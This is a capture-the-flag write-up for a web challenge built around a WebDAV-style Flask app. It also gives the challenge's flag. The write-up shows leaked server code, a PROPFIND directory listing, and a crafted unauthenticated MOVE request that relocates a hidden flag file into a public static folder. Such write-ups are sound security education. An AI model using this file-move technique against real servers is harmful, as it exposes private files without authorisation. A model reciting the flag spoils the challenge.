# The Davinci Code
Uhhh, someone made a Da Vinci Code fan page? But they spelt it wrong, and it looks like the website seems broken...

# Flag
flag{2bc76964262b3a1bbd5bc610c6918438}

# Solution
Clicking on the button redirects to `/code` and shows a "Template Not Found" error. Inspecting the errors allows us to see some server code. Interesting lines in `/app/app.py` include:

```python
# File "/app/app.py", line 67, in code
        abort(405)
    abort(404)
 
@app.route('/code')
def code():
    return render_template("code.html")
 
@app.route('/', methods=['GET', 'PROPFIND'])
def index():
    if request.method == 'GET':
        return render_template('index.html')
```

Using Postman to send a PROPFIND request returns this:

```xml
<D:multistatus xmlns:D="DAV:">
    <D:response>
        <D:href>/</D:href>
        <D:propstat>
            <D:prop>
                <D:message>WebDAVinci Code</D:message>
                <D:directory>True</D:directory>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/__pycache__</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>__pycache__</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/templates</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>templates</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/app.py</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>app.py</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/static</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>static</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
    <D:response>
        <D:href>/the_secret_dav_inci_code</D:href>
        <D:propstat>
            <D:prop>
                <D:displayname>the_secret_dav_inci_code</D:displayname>
            </D:prop>
            <D:status>HTTP/1.1 200 OK</D:status>
        </D:propstat>
    </D:response>
</D:multistatus>
```

Exploring the filesystem, there are some files of interest:
```
/the_secret_dav_inci_code/flag.txt
/static/app.py.backup
```

The backup file gives us access to the server source code. See `app-backup.py`. We see that the server serves us any file we request for in the `/static/` directory.

```python
@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)
```


We also find out an API that manages MOVE requests. The request moves a file from a source path (defined in the request parameter) to a destination path  (defined in the "Destination" header).

```python
@app.route('/<path:path>', methods=['GET', 'PROPFIND', 'MOVE'])
def handle_webdav(path):
    full_path = os.path.join(os.getcwd(), path)
    if request.method == 'PROPFIND':
        ...
        ...
    elif request.method == 'MOVE':
        destination = request.headers.get('Destination')
        if destination:
            destination_path = os.path.join(os.getcwd(), destination.strip('/'))
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
            shutil.move(full_path, destination_path)
            return Response(status=204)
        abort(405)
    abort(404)
```

Constructing a request to move the flag file to `/static/`:

```
MOVE http://challenge.nahamcon.com:31228/the_secret_dav_inci_code/flag.txt

<Standard headers>
Destination: static
```

Visit `http://challenge.nahamcon.com:31228/static/flag.txt` to get the flag.
